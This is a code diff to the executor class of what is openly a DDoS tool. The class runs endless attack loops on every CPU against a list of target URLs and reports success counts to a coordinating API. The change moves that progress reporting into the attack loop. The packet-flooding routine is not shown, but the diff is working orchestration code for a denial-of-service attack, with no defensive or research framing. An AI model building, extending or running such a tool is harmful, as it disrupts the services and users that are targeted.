@@ -13,24 +13,19 @@ class DdosPoolProcessExecutor:
         self._api_instance = api_instance
         self._threads_count = threads_count
         self._executed_results = manager.dict({url: 0 for url in urls})
+        self._processes_count = cpu_count() - 1 or 1
 
     #  Starts infinite ddos process on each CPU
     def start(self):
-        processes_count = cpu_count() - 1 or 1
-        cprint(f'[*] Start DDOS on {processes_count} CPUs\n', 'cyan')
+        cprint(f'[*] Start DDOS on {self._processes_count} CPUs\n', 'cyan')
 
-        with Pool(processes_count) as pool:
+        with Pool(self._processes_count) as pool:
             try:
-                pool.map(self._start_single_process, range(processes_count))
+                pool.map(self._start_single_process, range(self._processes_count))
             except KeyboardInterrupt:
                 cprint('\n[-] Canceled by user', 'red')
             except Exception as e:
                 cprint(f'\n[-] Something failed, exiting... {e}', 'red')
-            finally:
-                cprint(f'\n[*] Submitting stats...', 'cyan')
-                self._api_instance.submit_progress(processes_count, self._executed_results)
-                cprint('[*] Successfully submitted requests stats:', 'green')
-                self._print_executed_results()
 
     # Starts an infinite loop of executing ddos attacks alternately on each url
     def _start_single_process(self, initial_index: int):
@@ -44,6 +39,9 @@ class DdosPoolProcessExecutor:
 
                 self._executed_results[url] += success_count
                 self._print_executed_results()
+
+                # submit progress
+                self._api_instance.submit_progress(self._processes_count, {url: success_count})
             except KeyboardInterrupt:
                 break
 
